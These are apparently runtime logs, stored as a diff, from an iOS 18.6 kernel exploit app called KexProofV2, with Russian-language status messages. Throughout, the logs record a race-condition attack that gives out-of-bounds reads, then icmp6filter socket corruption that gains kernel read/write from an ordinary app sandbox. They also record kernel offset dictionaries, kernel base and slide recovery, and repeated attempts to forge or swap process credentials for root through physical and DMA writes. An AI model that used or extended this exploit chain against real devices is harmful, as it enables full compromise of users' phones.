+  [frame-type census] type=0x10 (pa=0x10072c84000)
+  [SCAN-Z2] прогресс 0x20000/0x780b6 (чтений 65536)
+  [SCAN-Z2] ★ proc_ro поле: pa=0x1009c3da488 (p_ucred==ucF + соседи) [тип кадра=24] — PSWAP-B вооружён
+  [SCAN-Z2] прогресс 0x28000/0x780b6 (чтений 98304)
+  [SCAN-Z2] прогресс 0x30000/0x780b6 (чтений 131072)
+  [SCAN-Z2] прогресс 0x38000/0x780b6 (чтений 163840)
+  [SCAN-Z2] прогресс 0x40000/0x780b6 (чтений 196608)
+  [SCAN-Z2] прогресс 0x48000/0x780b6 (чтений 229376)
+  [SCAN-Z2] прогресс 0x50000/0x780b6 (чтений 262144)
+  [frame-type census] type=0x32 (pa=0x10156278000)
+  [SCAN-Z2] прогресс 0x58000/0x780b6 (чтений 294912)
+  [SCAN-Z2] ucred-кандидат pa=0x10166614000: label+uid сошлись, live-сверка — мимо (расхождение @+0)
+  [SCAN-Z2] образец чужого ucred сохранён: pa=0x10166614000 (тип 24) — VMPROBE будет
+  [frame-type census] type=0x2f (pa=0x1017f9cc000)
+  [frame-type census] type=0x38 (pa=0x1017f9d0000)
+  [SCAN-Z2] прогресс 0x60000/0x780b6 (чтений 327680)
+  [SCAN-Z2] прогресс 0x68000/0x780b6 (чтений 360448)
+  [SCAN-Z2] прогресс 0x70000/0x780b6 (чтений 393216)
+  [SCAN-Z2] прогресс 0x78000/0x780b6 (чтений 425984)
+  [SCAN-Z2] финиш: кадров=0x780b6 чтений=426166 ucredPA=0 roFieldPA=0x1009c3da488 — ЦЕЛЬ НАЙДЕНА ★
+  [SCAN-Z2] гистограмма типов (кадров 491702, нет-таблицы 0): 11:338418 14:70625 16:11 17:384 18:1 19:6526 20:5 23:89 24:44 33:9171 47:1 48:9 49:7 50:2 51:8 52:9 53:21 54:40 55:794 56:1
+  [SCAN-Z2-BAND] kernel-проход 256MB..1GB (whitelist + 0x37)
+  [SCAN-Z2-BAND] прогресс 0x4000 (чтений 1)
+  [SCAN-Z2-BAND] прогресс 0x6000 (чтений 8193)
+  [frame-type census] type=0x2e (pa=0x1001f36c000)
+  [SCAN-Z2-BAND] прогресс 0x8000 (чтений 16385)
+  [SCAN-Z2-BAND] прогресс 0xa000 (чтений 24577)
+  [SCAN-Z2-BAND] прогресс 0xc000 (чтений 32769)
+  [SCAN-Z2-BAND] прогресс 0xe000 (чтений 40961)
+  [SCAN-Z2-BAND] финиш: чтений=49152 ucredPA=0 roFieldPA=0x1009c3da488
+  [T18-ENUM] перебор кадров типа 24 из frame table (наш ucred — в зоне этого типа)
+  [frame-type census] type=0x27 (pa=0x10004410000)
+  [frame-type census] type=0x5 (pa=0x10004428000)
+  [frame-type census] type=0x3 (pa=0x10007c00000)
+  [frame-type census] type=0x4 (pa=0x10007d10000)
+  [frame-type census] type=0x2 (pa=0x10007d64000)
+  [frame-type census] type=0x28 (pa=0x10007da4000)
+  [frame-type census] type=0x1 (pa=0x100095dc000)
+  [frame-type census] type=0x29 (pa=0x100095f0000)
+  [frame-type census] type=0x2a (pa=0x100096b4000)
+  [frame-type census] type=0xa (pa=0x100096fc000)
+  [frame-type census] type=0x39 (pa=0x10009784000)
+  [frame-type census] type=0x2c (pa=0x1000978c000)
+  [frame-type census] type=0x2b (pa=0x100097ac000)
+  [frame-type census] type=0x3a (pa=0x100097b0000)
+  [frame-type census] type=0x16 (pa=0x1000bef4000)
+  [frame-type census] type=0x1c (pa=0x1000bff8000)
+  [frame-type census] type=0x1b (pa=0x1000bffc000)
+  [T18-ENUM] кадров типа 24: всего 99, высоких 57, низких 16
+  [T18-ENUM] низкий кандидат[0] pa=0x1000b8d0000
+  [T18-ENUM] низкий кандидат[1] pa=0x1000b8dc000
+  [T18-ENUM] низкий кандидат[2] pa=0x1000bc34000
+  [T18-ENUM] низкий кандидат[3] pa=0x1000bc48000
+  [T18-ENUM] низкий кандидат[4] pa=0x1000bf38000
+  [T18-ENUM] низкий кандидат[5] pa=0x1000bf3c000
+  [T18-ENUM] низкий кандидат[6] pa=0x1000bf40000
+  [T18-ENUM] низкий кандидат[7] pa=0x1000bf48000
+  [T18-ENUM] низкий кандидат[8] pa=0x1000bf4c000
+  [T18-ENUM] низкий кандидат[9] pa=0x1000bf50000
+  [T18-ENUM] низкий кандидат[10] pa=0x1000bf60000
+  [T18-ENUM] низкий кандидат[11] pa=0x1000bf64000
+  [T18-ENUM] низкий кандидат[12] pa=0x1000bf68000
+  [T18-ENUM] низкий кандидат[13] pa=0x1000bf6c000
+  [T18-ENUM] низкий кандидат[14] pa=0x1000bf70000
+  [T18-ENUM] низкий кандидат[15] pa=0x1000bf74000
+  [T18-ENUM] низких 16 — пробуем первый pa=0x1000b8d0000 (список выше для добора)
+  [PSWAP-B] KVA-верификация маркером: papt=✓ linear=✗ → KVA=0xfffffff1609a4000
+  [PSWAP-B] forge page: PA=0x10118c8c000 KVA=0xfffffff1609a4000 → поле 0x1009c3da488
+  [PHYSWRITE8v2] target=0x1009c3d8000+0x2488 payload=0xfffffff1609a4000 kr=0x0
+  [PSWAP-B] запись=kr=0 readback=0xffffffdf41fc87c0 (ждём 0xfffffff1609a4000) → НЕ ПРИЛИПЛО
+  [FORGE] валидация ПРОПУЩЕНА (VMPROBE-on-faith) — INPL пишет и проверяет через readback
+  [FORGE] pageVA=0xffffffdf41fc8000 pagePA=0x1000b8d0000 uoff=0x7c0 — валидация PA: СОШЛАСЬ
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [INPL] physwrite8: 00000 | readback cr_uid=501 groups0=501 cr_label=0xc09dffdf41ddacc0 | getuid()=501 getgid()=501
+  [INPL] не прилипло — откат не нужен (контент не изменился), иду в тяжёлый форж
+  [FORGE] DEP-хиты перепатчены на ucredPFN (1 шт)
+  [FORGE] victim#2 submit (ucredPA, fresh pipe): kr=0x0 — жду DMA в ucred
+  [FORGE] getuid()=501 getgid()=501 | cr_uid=501 cr_label=0xc09dffdf41ddacc0
+Отчёт записан: /var/mobile/Containers/Data/Application/2816C38E-BBD4-4701-A3EF-7B77A8C6399B/Documents/kexproof-paswap.txt
+
+
+
+
+========== FILE: kexproof-live.log (34465 байт, mtime=2026-10-06 05:35:59 +0000) ==========
+=== запуск KexProofV2 2.0.16 @ 2026-10-06 05:34:45 +0000 ===
+KexProofV2 загружен. Эксплойт работает в обычной песочнице приложения, без джейлбрейк-энтитлментов.
+[auto] запускаю эксплойт сам (автостарт)
+=== KexProofV2 2.0.16 — iPhone16,1, Darwin 24.6.0 ===
+iOS 18.6
+
+[Этап 1/4] Патчфайндинг (XPF)
+kernelcache: /private/var/containers/Bundle/Application/0ABE6383-0777-4CE7-BDF7-6F63E5F064EF/KexProofV2.app/kernelcache
+sptm: /private/var/containers/Bundle/Application/0ABE6383-0777-4CE7-BDF7-6F63E5F064EF/KexProofV2.app/sptm.img4
+txm: /private/var/containers/Bundle/Application/0ABE6383-0777-4CE7-BDF7-6F63E5F064EF/KexProofV2.app/txm.img4
+XPF: kernel загружен, base=0xfffffff007004000 darwin=24.6.0 sptm=–¥–∞ txm=–¥–∞
+[xpf] resolve kernelConstant.kernel_el...
+[xpf] resolve kernelSymbol.start_first_cpu...
+[xpf] resolve kernelSymbol.allproc...
+[xpf] resolve kernelSymbol.kalloc_data_external...
+[xpf] resolve kernelSymbol.fatal_error_fmt...
+[xpf] resolve kernelSymbol.kfree_data_external...
+[xpf] resolve kernelSymbol.SPTMArgs...
+[xpf] resolve kernelSymbol.cpu_ttep...
+[xpf] resolve kernelSymbol.arm_vm_init...
+[xpf] resolve kernelSymbol.gVirtBase...
+[xpf] resolve kernelSymbol.gPhysBase...
+[xpf] resolve kernelSymbol.gPhysSize...
+[xpf] resolve kernelConstant.pointer_mask...
+[xpf] resolve kernelSymbol.pointer_mask...
+[xpf] resolve kernelSymbol.pmap_bootstrap...
+[xpf] resolve kernelConstant.T1SZ_BOOT...
+[xpf] resolve kernelConstant.ARM_TT_L1_INDEX_MASK...
+[xpf] resolve kernelSymbol.txm_trustcache_root...
+[xpf] resolve kernelSymbol.txm_deviceTreeTrustCacheRange...
+[xpf] resolve kernelSymbol.vm_page_array_beginning_addr...
+[xpf] resolve kernelSymbol.vm_page_array_ending_addr...
+[xpf] resolve kernelSymbol.vm_first_phys_ppnum...
+[xpf] resolve kernelSymbol.vm_first_phys...
+[xpf] resolve kernelSymbol.sptm_get_page_table_refcnt...
+[xpf] resolve kernelSymbol.vm_last_phys...
+[xpf] resolve kernelSymbol.pp_attr_table...
+[xpf] resolve kernelSymbol.pmap_enter_pv...
+[xpf] resolve kernelSymbol.pv_head_table...
+[xpf] resolve kernelSymbol.pv_alloc...
+[xpf] resolve kernelSymbol.libsptm_papt_ranges...
+[xpf] resolve kernelSymbol.libsptm_init...
+[xpf] resolve kernelSymbol.wfe_timeout_configure...
+[xpf] resolve kernelSymbol.libsptm_n_papt_ranges...
+[xpf] resolve kernelSymbol.papt_ranges_compressed...
+[xpf] resolve kernelSymbol.papt_ranges_update...
+[xpf] resolve kernelSymbol.n_papt_ranges_compressed...
+[xpf] resolve kernelSymbol.libsptm_frame_table...
+[xpf] resolve kernelSymbol.libsptm_frame_type_params...
+[xpf] resolve kernelStruct.sptm_frame_type_descriptor.struct_size...
+[xpf] resolve kernelStruct.proc.struct_size...
+[xpf] resolve kernelStruct.task.itk_space...
+[xpf] resolve kernelSymbol.task_collect_crash_info...
+[xpf] resolve kernelSymbol.task_crashinfo_release_ref...
+[xpf] resolve kernelStruct.vm_map.pmap...
+[xpf] resolve kernelStruct.IOSurface.ranges...
+[xpf] resolve kernelStruct.IOSurface.IOMemoryDescriptor_withAddressRanges_ref...
+[xpf] resolve kernelStruct.IOSurface.rangeCount...
+[xpf] resolve kernelConstant.nsysent...
+[xpf] resolve kernelSymbol.proc_get_syscall_filter_mask_size...
+[xpf] resolve kernelConstant.mach_trap_count...
+[xpf] resolve kernelSymbol.mach_kobj_count...
+Словарь оффсетов XPF:
+  0x0000000000000060 <- kernelStruct.sptm_frame_type_descriptor.struct_size
+  0xfffffff0270d8bf0 <- kernelSymbol.n_papt_ranges_compressed
+  0xfffffff007b37750 <- kernelSymbol.libsptm_n_papt_ranges
+  0xfffffff007aa2968 <- kernelSymbol.pv_head_table
+  0x0000000000000011 <- kernelConstant.T1SZ_BOOT
+  0xfffffff007b37768 <- kernelSymbol.vm_last_phys
+  0xfffffff007aa29a8 <- kernelSymbol.vm_first_phys_ppnum
+  0xfffffff007aa29b0 <- kernelSymbol.vm_page_array_ending_addr
+  0xfffffff007aa29b8 <- kernelSymbol.vm_page_array_beginning_addr
+  0xfffffff007af4b48 <- kernelSymbol.gPhysBase
+  0xfffffff007aa32b0 <- kernelSymbol.cpu_ttep
+  0xfffffff00802b7f8 <- kernelSymbol.kalloc_data_external
+  0xfffffff007ad9f40 <- kernelSymbol.mach_kobj_count
+  0x00000000000003a4 <- kernelStruct.IOSurface.rangeCount
+  0x0000000000000040 <- kernelStruct.vm_map.pmap
+  0xfffffff007af4b50 <- kernelSymbol.gPhysSize
+  0x0000000000000001 <- kernelConstant.kernel_el
+  0xfffffff027004000 <- kernelConstant.staticSptmBase
+  0xfffffff007004000 <- kernelConstant.staticBase
+  0x000000000000022e <- kernelConstant.nsysent
+  0x0000000000000740 <- kernelStruct.proc.struct_size
+  0xfffffff007b37760 <- kernelSymbol.vm_first_phys
+  0xfffffff017004000 <- kernelConstant.staticTxmBase
+  0x0000000000000080 <- kernelConstant.mach_trap_count
+  0xfffffff007b37790 <- kernelSymbol.libsptm_frame_type_params
+  0xfffffff0270d8c00 <- kernelSymbol.papt_ranges_compressed
+  0xfffffff007b37758 <- kernelSymbol.libsptm_papt_ranges
+  0xfffffff007aa2960 <- kernelSymbol.pp_attr_table
+  0x0000000000000360 <- kernelStruct.IOSurface.ranges
+  0x0000000000000318 <- kernelStruct.task.itk_space
+  0x00007ff000000000 <- kernelConstant.ARM_TT_L1_INDEX_MASK
+  0xfffffff00aaa2608 <- kernelSymbol.allproc
+  0xfffffff007b37788 <- kernelSymbol.libsptm_frame_table
+  0xfffffff017010590 <- kernelSymbol.txm_trustcache_root
+  0xffff800000000000 <- kernelConstant.pointer_mask
+  0xfffffff007ac4c70 <- kernelSymbol.gVirtBase
+  0xfffffff007b36a48 <- kernelSymbol.SPTMArgs
+  0xfffffff00802be88 <- kernelSymbol.kfree_data_external
+gSystemInfo заполнена (динамические + жёстко заданные оффсеты)
+
+[Этап 2/4] Эксплойт ClearSword (может занять несколько минут)
+[cleanup] spray tracking arrays released (0/0 entries left, BUG.2)
+machine: iPhone16,1
+hw.cpufamily: 0x2876f5b5
+[KP] engine start: iOS 18.6, iPhone16,1, cpufamily 0x2876f5b5 — offsets: icmp6filt=0x148 chksum=0x150 pcbinfo=0x38 ipi_zone=0x68 zone_elem_size=0x34 itk_space=0x318
+[+] Running on non-A18 device
+[i] low-RAM device (7682MB) — search space scaled to 0xf016 pages (floor 0x8000)
+[i] totalSearchMappingPagesNum: 0xf016
+[i] searchMappingSize: 0x8000000
+[i] totalSearchMappingSize: 0x3c058000
+[i] searchMappingNum: 0x7
+[+] physicalMappingAddress: 0x1012fc000
+[+] pcAddress: 0xf14bd0000
+[+] pe_v1 spray/race cycle 1/6
+[cleanup] spray tracking arrays released (0/0 entries left, BUG.2)
+[i] socketPortsCount: 22528
+[i] startPcbId: 4 endPcbId: 45058
+[i] looking in search mapping: 0
+[race] pwritev failed (w=-1) #1 at try 0 — race window hit
+[race] OOB READ LANDED #1 (try 0, mo=0x590703 off=0) buf0=0
+[race] OOB READ LANDED #2 (try 89, mo=0x590703 off=0x134000) buf0=0x61e445e1a11a2ca7
+[race] OOB READ LANDED #3 (try 70, mo=0x590703 off=0x164000) buf0=0x1a66703b3
+[race] OOB READ LANDED #4 (try 48, mo=0x590703 off=0x1bc000) buf0=0x3f32dec4781bbf37
+[+] mid-scan spray #1 @ 0x200000 added 1024 sockets (total 23552)
+[race] OOB READ LANDED #5 (try 178, mo=0x590703 off=0x284000) buf0=0x5d
+[race] OOB READ LANDED #6 (try 189, mo=0x590703 off=0x2a0000) buf0=0
+[race] OOB READ LANDED #7 (try 207, mo=0x590703 off=0x2c0000) buf0=0x342d323045322d45
+[race] OOB READ LANDED #8 (try 58, mo=0x590703 off=0x2e4000) buf0=0x155800207da1ab9
+[race] OOB READ LANDED #9 (try 28, mo=0x590703 off=0x2ec000) buf0=0
+[race] OOB READ LANDED #10 (try 60, mo=0x590703 off=0x2fc000) buf0=0x2597318b0
+[+] mid-scan spray #2 @ 0x400000 added 1024 sockets (total 24576)
+[race] pwritev failed (w=-1) #1001 at try 105 — race window hit
+[race] OOB READ LANDED #500 (try 346, mo=0x590703 off=0x3bf0000) buf0=0
+[+] pcbStartOffset: 0x400 (filt=0x148 gencnt=0x78)
+[+] targetInpGencnt: 0x1626
+[+] inpListNextPointer: 0xffffffe10a74ffe0
+[+] icmp6Filter: 0xffffffe2dac13480
+[STAGED] stage 1/2 pass — readonly layout validated on-device (filt=0x148 gencnt=0x78), kernel writes measured so far: 0 (BUG.5); corrupting single socket
+[+] alias write (icmp6filt): 0xffffffe10a750128 verified (writeKr=0, attempts=1)
+[+] re-alias (neighbor): 0xffffffe10a750948 verified (writeKr=0, attempts=1)
+[STAGED] re-alias на newer якорь 0xffffffe10a750948: verified
+[+] probe: rw в окне @+0x800 (gencnt=0x1628 → порт #2834, newer якорь) — бинд по окну
+[probe] selftest: getsockopt(control fd=10) через алиас → res=0 len=32 qword0=0xffffffe2dac134a0 (в окне icmp6Filter был 0xffffffe2dac13480)
+[+] probe fds: пара открыта — control idx=2833 fd=10, rw idx=2834 fd=11
+[STAGED] zone window: pcb 0xffffffe10a750400 zone bucket not a kalloc class (raw 0) (qword 0) vs field span 0x160 -> declaring 0x160 bytes (field span (bucket unknown))
+[STAGED] probe (control inp6_chksum at pcb+0x150 = 0xffffffe10a750550): read 0, wrote 0x4141414141414141, read back 0x4141414141414141, restored 0 — krw write+read verified (control-side, clamped)
+[STAGED] probe promoted: icmp6filt corruption KEPT (idx=2833), proven by an inp6_chksum round trip — this socket IS the krw primitive; restore is owned by the caller (run_write_test / staged stage-2 failure path)
+[cleanup] pe_v1: memory object 0x590703 released (kr=0)
+[cleanup] sockets_release: 24576 sprayed socket fileports released
+[cleanup] pe_v1: search mapping 0xda81cc000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: search mapping 0x6bef90000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: search mapping 0x668428000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: search mapping 0x4266a0000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: search mapping 0xc9b0c8000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: search mapping 0x5c0cb0000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: search mapping 0xb4aacc000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: searchMappings tracker released (0 left, BUG.2)
+[cleanup] spray tracking arrays released (0/0 entries left, BUG.2)
+[+] pe_v1 socket corruption succeeded
+[cleanup] pe_v1: gencnt tracker released (1 entries, BUG.2)
+[+] highestSuccessIdx: 497
+[+] successReadCount: 514
+[SCAN] kernel writes issued this attempt: 2 write(s), 64 byte(s) [measured by kwrite_counter, BUG.5]
+[SCAN]   by route: early_kwrite32bytes=0  early_kwrite64=0  krw_zone_write_block=2  (refused: 0)
+[cleanup] kexploit: free thread stopped + joined (BUG.2)
+[cleanup] kexploit: target fds closed (readFd=8 writeFd=9, BUG.2)
+[+] kernel base scan start: 0xfffffff04bd08000 (zv_name=0xfffffff04bd09d38)
+    scan iter 0 base=0xfffffff04bd04000 val=0x6e6f207369207325
+[STAGED] stage 2/2 pass — krw read chain + kernel magic verified (base=0xfffffff04bc98000 slide=0x44c94000); full chain proceeding
+early_kread64(0xfffffff04bc98000) -> 0x100000cfeedfacf
+win??
+[engine] returning 0 — промоушн и база ядра подтверждены; повторный pe_v1 в этом процессе запрещён
+[+] readFd: 8
+[+] writeFd: 9
+[+] pcObject: 40743
+[+] Corrupting icmp6filter pointer...
+[+] Found control_socket at idx: 2833
+Эксплойт УСПЕШЕН. kernel slide = 0x44c94000, kernel base = 0xfffffff04bc98000
+kreadbuf=0xbd7f80010037806c kwritebuf=0xbb35000100378088 minSafeRead=0x20
+
+[Этап 3/4] Константы загрузки и трансляция адресов
+  gVirtBase: raw=0xfffffff026af0000 strip=0xfffffff026af0000
+  gPhysBase: raw=0x0000010002af0000 strip=0x0000010002af0000
+  gPhysSize: raw=0x00000001e02d8000 strip=0x00000001e02d8000
+  cpu_ttep: raw=0x0000010007ce4000 ttbr-phys=0x0000010007ce4000 va-формой=0x0000010007ce4000
+  EXP-02: DEBG не найден (16 pointees — стабы), перехожу к pointer-vote
+  EXP-02 (формула, без голосования): sptmBase=0xfffffff02bc98000 sptmSlide=0x4c94000
+  EXP-02 (формула): txmBase=0xfffffff03bc98000 txmSlide=0x24c94000
+  base=0xfffffff04bc98000 virtBase=0xfffffff026af0000 physBase=0x10002af0000 physSize=0x1e02d8000 cpuTTEP=0x10007ce4000 sptmBase=0xfffffff02bc98000 sptmSlide=0x4c94000 txmBase=0xfffffff03bc98000 txmSlide=0x24c94000
+
+[E9 auto] root через ucred swap — сразу после победы, без нажатий
+  наш pid: 491
+  наш proc (proc_self): 0x0000000000000000
+  наш proc по pid 491 @ 0xffffffe2d77dd660 (fast walk, узлов=0)
+  proc+0xD8 = 0x0000000000000000 (мёртвое поле на 15.2+; ucred уехал в proc_ro)
+  proc_ro: raw=0xffffffdf41f82460 → 0xffffffdf41f82460
+  proc_ro.ucred @ 0xffffffdf41f82488: raw=0xffffffdf41fc87c0 → 0xffffffdf41fc87c0
+  текущий ucred: uid=501 gid=501 (getuid()=501 getgid()=501)
+  цепь: task=0xffffffe2d77ddda0 map=0xffffffdef28b0d60 pmap=0xffffffdf420a7040 ttep=0x101aa45c000
+  страница: userVA=0x1017d4000 pa=0x1010f668000 → kernel VA (ptov)=0xfffffff157380000
+  чтение форжа по kernel VA: 0xffffffe0269c7490 (ждём начало скопированного ucred)
+  оригинальный p_ucred = 0xffffffdf41fc87c0
+  [E9] kwrite по proc_ro ПРОПУЩЕН (RO-зона, ZC_READONLY) — readback=0xffffffdf41fc87c0 (оригинал на месте, это ок)
+
+=== EXP-09: root через подмену указателя p_ucred (heap-only) ===
+  наш pid: 491
+  наш proc (proc_self): 0x0000000000000000
+  наш proc по pid 491 @ 0xffffffe2d77dd660 (fast walk, узлов=0)
+  proc+0xD8 = 0x0000000000000000 (мёртвое поле на 15.2+; ucred уехал в proc_ro)
+  proc_ro: raw=0xffffffdf41f82460 → 0xffffffdf41f82460
+  proc_ro.ucred @ 0xffffffdf41f82488: raw=0xffffffdf41fc87c0 → 0xffffffdf41fc87c0
+  текущий ucred: uid=501 gid=501 (getuid()=501 getgid()=501)
+  цепь: task=0xffffffe2d77ddda0 map=0xffffffdef28b0d60 pmap=0xffffffdf420a7040 ttep=0x101aa45c000
+  страница: userVA=0x1017d4000 pa=0x1010f668000 → kernel VA (ptov)=0xfffffff157380000
+  чтение форжа по kernel VA: 0xffffffe0269c7490 (ждём начало скопированного ucred)
+  оригинальный p_ucred = 0xffffffdf41fc87c0
+  [E9] kwrite по proc_ro ПРОПУЩЕН (RO-зона, ZC_READONLY) — readback=0xffffffdf41fc87c0 (оригинал на месте, это ок)
+FAIL: heap-only swap через kwrite нежизнеспособен на 18.6 — proc_ro RO-зона.
+Используй авто-цепь PHYSWRITE: INPL (in-place ucred) или PSWAP-B (DMA в поле p_ucred).
+[E9 auto] uid сейчас: 501 (–Ω–µ root)
+Этапы 1-3 готовы, KRW жив. Дамп — отдельной кнопкой (дамп пишется инкрементально, паника не сотрёт готовые секции).
+=== IOSurface backing-PA swap: physwrite через DMA ===
+  [DCPAV] DCPAVControllerProxy: open kr=0xe00002e2
+  [DCPAV] DCPAVDeviceProxy: open kr=0xe00002e2
+  [DCPAV] DCPAVServiceProxy: open kr=0xe00002e2
+  [DCPAV] DCPAVVideoInterfaceProxy: open kr=0xe00002e2
+  [DCPAV] DCPAVAudioInterfaceProxy: сервис НЕ найден
+  surfaces: srcID=15 dstID=12 (подменяем backing у dst)
+  процесс "KexProofV2" (p_name="KexProofV2") @ 0xffffffe2d77dd660 (узлов=0)
+  контрольная страница: VA=0x1017dc000 PA=0x10142234000 (заполнена 0xCC)
+  [CAL] physmap-алиасы (рано, маркер жив): linear=0xaa0103f9 papt=0xcafebabe → PAPT ✓
+  ctlPA валидация: phystokv(0x10142234000)=0xcafebabe → ВЕРНО
+  backing PA dst = 0x10030520000 (vtophys пикселей VA=0x10450c000), маркер по phystokv: 0x41544159 → ПОДТВЕРЖДЁН
+  SCAN A (после create, до churn/submit):
+  frame table: raw=0xfffffff05078c000 → VA 0xfffffff05078c000
+    [A] hit#1 форма4 @ 0xfffffff056444830: 0x000000040400c148
+    [A] hit#2 форма1 @ 0xfffffff1f8c220a8: 0x0000010030520000
+    [A] hit#3 форма1 @ 0xfffffff1fe902678: 0x0000010030520000
+  [A] попаданий=3 (форма1=rawPA 2=pfn64lo 3=pfn32hi 4=pfn32lo)
+  isTable=0xffffffed0cd8c000 (звенья: proc_ro=0xffffffdf41f82460 task=0xffffffe2d77ddda0 itk=0xd1e6ffe027ed2728)
+  ip_kobject oracle: task port VA=0xffffffe10b4aec50 selfTask=0xffffffe2d77ddda0 → ip_kobject @ +0x48 (статика +0x48)
+  порт-маршрут: smp=0x347e77 kobj=0xffffffe028843120 vt=0xfffffff04c797d68 (file 0xfffffff007b03d68; SendRight ждём 0xfffffff04cb834c8)
+    kobj+0x00: raw=0x128b7ff04c797d68 untag=0xfffffff04c797d68 → [+0x10]=0x4d297234 surfFast=0
+    kobj+0x08: raw=0x0000000100000001 untag=0x0000000100000001
+    kobj+0x10: raw=0x0000010122000000 untag=0x0000010122000000
+    kobj+0x18: raw=000000000000000000 untag=000000000000000000
+    kobj+0x20: raw=0xffffffe028840c60 untag=0xffffffe028840c60 → [+0x10]=0x22000000 surfFast=0
+    kobj+0x28: raw=0xffffffe10864e860 untag=0xffffffe10864e860 → [+0x10]=0 surfFast=0
+    kobj+0x30: raw=0x52c47fe2d9864fa0 untag=0xffffffe2d9864fa0 → [+0x10]=0xf41ec400 surfFast=0
+    IOMachPort: fPort=0xffffffe10864e860 kotype=0x1b fObject=0xffffffe2d9864fa0 vt=0xfffffff04cb834c8 (file 0xfffffff007eef4c8 = SendRight!)
+    SendRight ✓: owner(Root)=0xffffffe1f41ec400 IOSurface=0xffffffe10e25ad40 ([surf+0x10]=0xc ждём 12) surfFast=0
+  ★ smp IOMachPort-хоп → IOSurface 0xffffffe10e25ad40
+  ★ порт-маршрут дал surfVA=0xffffffe10e25ad40 — слоты/подмена ДО submit
+  IOSurface 0xffffffe10e25ad40: rangeObj(+0x178)=0xffffffedf8c908a0 plane(+0x30)=0xffffffdf4485e3e8 ranges(+0x360)=0 rangeCount(+0x3a4)=0
+  planeDesc vtable: 0xfffffff04c7c7db8 (file 0xfffffff007b33db8) — класс IOMD
+    IOMD lvl0: md=0xffffffdf4485e3e8 [+0x60]=0xffffffe10e3e9fe0 count=1 [0]=000000000000000000 [8]=0x0000000000080000
+    pd+0000: 0x44a67ff04c7c7db8
+    pd+0x08: 0x0000000000010002
+    pd+0x10: 0xffffffe0264f9300
+    pd+0x18: 0xffffffe1f3b0b580
+    pd+0x20: 0x0000000000510513
+    pd+0x28: 0xffffffe028713880
+    pd+0x30: 0x000000000058004e
+    pd+0x38: 000000000000000000
+    pd+0x40: 000000000000000000
+    pd+0x48: 000000000000000000
+    pd+0x50: 0x0000000000080000
+    pd+0x58: 000000000000000000
+    pd+0x60: 0xffffffe10e3e9fe0
+    pd+0x68: 0x0000000000000001
+    pd+0x70: 0xffffffe2d9a801e0
+    pd+0x78: 000000000000000000
+    pd+0x80: 000000000000000000
+    pd+0x88: 0x0000000100000000
+    pd+0x90: 0xffffffe10d754250
+    pd+0x98: 0x0406e1fe00000020
+    pd+0xa0: 000000000000000000
+    pd+0xa8: 0xffffffe2da0d4b70
+    pd+0xb0: 000000000000000000
+    pd+0xb8: 000000000000000000
+    pd+0xc0: 0x0000000000080000
+    pd+0xc8: 0x0000000000004000
+    pd+0xd0: 0x0000000000110063
+    pd+0xd8: 000000000000000000
+    pd+0xe0: 0x0000000000000008
+    pd+0xe8: 0xdea87ff04c7c7db8
+    pd+0xf0: 0x0000000000010004
+    pd+0xf8: 0xffffffe0264faf20
+  IOSurface найден, но pfn-слотов нет — уходим в старые пути
+  [frame-type census] type=0x11 (pa=0x101aa45c000)
+  [frame-type census] type=0x13 (pa=0x1017f9c8410)
+  [CHAIN-S] srcVA=0xffffffe10e25b100 pd=0xffffffdf4484f520 type=0x10 buf=0xffffffe02813cc80 count=0x20 entry0=0x000000040400ae68 — маркеры сошлись (physread вооружён)
+  [CHAIN] pd=0xffffffdf4485e3e8 vt=0xfffffff04c7c7db8 type=0x10 hdr=0xffffffe10d754250 buf=0xffffffe02813c800 count=0x20 flags=0xc0 — маркеры сошлись, патчим entries
+  [CHAIN] ★ entry[0] @ 0xffffffe02813c830: 0x000000040400c148 → ctlPFN 0x405088d (зона: не зона/VM)
+      readback: 0x000000040405088d — ПРИЛИПЛО
+  [PH] VAD (VA-field deputy) — старт
+  [frame-type census] type=0x8 (pa=0x10007ce7fe8)
+  [frame-type census] type=0x9 (pa=0x1000974fd10)
+  [frame-type census] type=0x21 (pa=0x1018b9323e8)
+  [frame-type census] type=0xb (pa=0x1000d2e08a0)
+  [frame-type census] type=0xc (pa=0x10007797db8)
+  [VAD] VA-поле не найдено (пулов=15, полей проверено=66, physmap-скип=60) — следующий шаг: pv_head/второй уровень
+  [PH] PAR (parent-ranges) — старт
+  [PAR] parentMD=0xffffffe10e3e9fe0 arr=0x66eadc000 count=32768
+  [VDB] [planeDesc+0xb8] = 000000000000000000 (ноль — ranges-based)
+  [VDB] vmctx [0x7b33f28]=0xffffffde0c3ba890 (sym 0xfffffff04c7c7f28)
+    vmctx+0: 0x0000000033000000
+    vmctx+0x8: 0x0000000000420000
+    vmctx+0x10: 0xffffffde0c3beed0
+    vmctx+0x18: 0xffffffde0c3bfdd0
+    vmctx+0x20: 0xffffffdc00000000
+    vmctx+0x28: 0xfffffffbffffffff
+    vmctx+0x30: 0x0000000e00000883
+    vmctx+0x38: 0xffffffde0c452d60
+    vmctx+0x40: 0x6ed17ff04f714170
+    vmctx+0x48: 0x00000014c5988000
+    vmctx+0x50: 0x7fffffffffffffff
+    vmctx+0x58: 0x7fffffffffffffff
+    vmctx+0x60: 0x0000000fc0000000
+    vmctx+0x70: 0x00000000000007c7
+    vmctx+0xc0: 0xffffffde0caf04a0
+    vmctx+0xc8: 0xffffffdef292dac0
+    vmctx+0xd0: 0xffffffde0c3c14e0
+    vmctx+0xd8: 0x000f47b900000080
